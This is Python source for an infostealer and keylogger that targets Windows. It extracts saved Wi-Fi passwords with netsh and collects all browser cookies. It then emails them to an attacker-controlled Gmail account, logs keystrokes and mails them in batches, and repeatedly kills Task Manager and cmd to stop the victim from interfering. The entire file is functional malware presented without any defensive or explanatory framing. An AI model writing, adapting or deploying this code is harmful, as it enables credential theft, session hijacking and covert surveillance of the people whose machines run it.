import keyboard
import smtplib
import time
import psutil
import threading
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
import subprocess
import re
#############################################################################
def mail(res):
	fromaddr = gmailaddress
	toaddr = gmailaddress
	msg = MIMEMultipart() 
	msg['From'] = fromaddr 
	msg['To'] = toaddr 
	msg['Subject'] = "ID"
	body = res
	msg.attach(MIMEText(body, 'plain'))  
	s = smtplib.SMTP('smtp.gmail.com', 587) 
	s.starttls() 
	s.login(fromaddr,fromaddr-password)  
	text = msg.as_string() 
	s.sendmail(fromaddr, toaddr, text)  
	s.quit() 
###############################################################################
################################################################################
#################WIFI PASSWORDS################################################
name_regex = re.compile(r"All User Profile\s+: (.*)\b")
password_regex = re.compile(r"Key Content\s+: (.*)\b")

result_1 = subprocess.run(
    ["netsh", "wlan", "show", "profiles"], text=True, capture_output=True, check=True)

wifi_names = name_regex.findall(result_1.stdout)
wifidata=""
for name in wifi_names:

    name = r"{}".format(name)

    try:
        result_2 = subprocess.run(["netsh", "wlan", "show", "profiles", str(
            name), "key=clear"], text=True, capture_output=True, check=True)
        password = password_regex.findall(result_2.stdout)
        if len(password) != 0:

            wifidata+=name+"--"+password[0]+"\n"
        else:
            
            wifidata+=name+"--OPENWIFI\n"
    except:
        print(name, "Unable to get password")
######################COOKIE FUNCTION#####################################
cook=""
import browser_cookie3
cj = browser_cookie3.load()
for c in cj:
    cook+=str(c)
#################################MAIL########################################
mail(cook)
mail(wifidata)
##############################killer and kelogger##########################
def loop_a():
	while 1:
		for proc in psutil.process_iter():
			try:
				if any(procstr in proc.name() for procstr in\
        	    	   ['Taskmgr','cmd']):
						print("killing taskmanager")
						proc.kill()
	
			except(psutil.NoSuchProcess,psutil.AccessDenied,psutil.ZombieProcess):
				continue
		time.sleep(1)
def loop_b():
	log=""
	while 1:
		key=keyboard.read_key()
		if key=="`":
			break
		if key=="backspace":
			key="back"
		log+=key+" "
		if len(log)>200:
			mail(log)
			log=""
		time.sleep(0.02) 
 
thread2 = threading.Thread(target=loop_b)
thread2.start()
thread1 = threading.Thread(target=loop_a)
if (thread2.is_alive()):
	thread1.start()